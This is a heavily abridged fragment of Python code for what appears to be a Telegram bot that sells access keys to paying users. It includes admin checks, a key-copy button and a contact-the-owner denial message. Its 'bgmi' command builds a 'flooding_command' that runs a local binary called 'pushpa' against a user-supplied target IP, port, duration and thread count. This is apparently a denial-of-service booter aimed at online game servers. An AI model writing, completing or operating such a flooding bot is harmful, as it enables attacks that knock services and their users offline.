    ...
    if user_id in ADMIN_IDS:
        ...
        if len(command) == 2:
            try:
                ...
                keyboard = [
                    [InlineKeyboardButton(f"Copy Key: {key}", callback_data=f"copy_key_{key}")]  # Prefix the callback_data to distinguish it
                ]
        ...
        response = "❌ ACCESS DENIED. CONTACT OWNER - @RAJOWNER90"
...
async def bgmi(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    ...
    flooding_command = ['./pushpa', target_ip, port, duration, str(DEFAULT_THREADS)]
